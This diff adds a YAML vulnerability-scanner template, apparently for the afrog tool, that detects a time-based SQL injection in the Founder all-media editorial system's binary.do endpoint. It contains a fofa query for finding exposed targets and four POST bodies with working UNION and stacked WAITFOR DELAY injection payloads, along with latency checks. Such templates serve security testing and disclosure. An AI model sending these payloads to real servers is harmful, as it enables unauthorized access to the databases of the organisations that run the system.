@@ -1,0 +1,55 @@
+id: founder-binary-do-sqli.yaml
+
+info:
+  name: 方正畅享全媒体采编系统 binary.do SQL注入
+  author: zan8in
+  severity: high
+  verified: false
+  description: |-
+    方正畅享全媒体采编系统binary.do存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息。
+    fofa: app="FOUNDER-全媒体采编系统"
+  tags: sqli,方正,方正畅享全媒体采编系统
+  created: 2025/03/10
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /newsedit/newsplan/task/binary.do
+      body: |
+        TableName=DOM_IMAGE+where+REFID%3D-1+union+select+%271%27%3B+WAITFOR+DELAY+'0:0:6';select+DOM_IMAGE+from+IMG_LARGE_PATH&FieldName=IMG_LARGE_PATH&KeyName=REFID&KeyID=1
+    expression: |
+      response.status == 200 && 
+      response.latency <= 8000 &&  
+      response.latency >= 6000
+  r1:
+    request:
+      method: POST
+      path: /newsedit/newsplan/task/binary.do
+      body: |
+        TableName=DOM_IMAGE+where+REFID%3D-1+union+select+%271%27%3B+WAITFOR+DELAY+'0:0:10';select+DOM_IMAGE+from+IMG_LARGE_PATH&FieldName=IMG_LARGE_PATH&KeyName=REFID&KeyID=1
+    expression: |
+      response.status == 200 && 
+      response.latency <= 12000 &&  
+      response.latency >= 10000
+  r2:
+    request:
+      method: POST
+      path: /newsedit/newsplan/task/binary.do
+      body: |
+        TableName=DOM_IMAGE+where+REFID%3D-1+union+select+%271%27%3B+WAITFOR+DELAY+'0:0:6';select+DOM_IMAGE+from+IMG_LARGE_PATH&FieldName=IMG_LARGE_PATH&KeyName=REFID&KeyID=1
+    expression: |
+      response.status == 200 && 
+      response.latency <= 8000 &&  
+      response.latency >= 6000
+  r3:
+    request:
+      method: POST
+      path: /newsedit/newsplan/task/binary.do
+      body: |
+        TableName=DOM_IMAGE+where+REFID%3D-1+union+select+%271%27%3B+WAITFOR+DELAY+'0:0:10';select+DOM_IMAGE+from+IMG_LARGE_PATH&FieldName=IMG_LARGE_PATH&KeyName=REFID&KeyID=1
+    expression: |
+      response.status == 200 && 
+      response.latency <= 12000 &&  
+      response.latency >= 10000
+expression: r0() && r1() && r2() && r3()
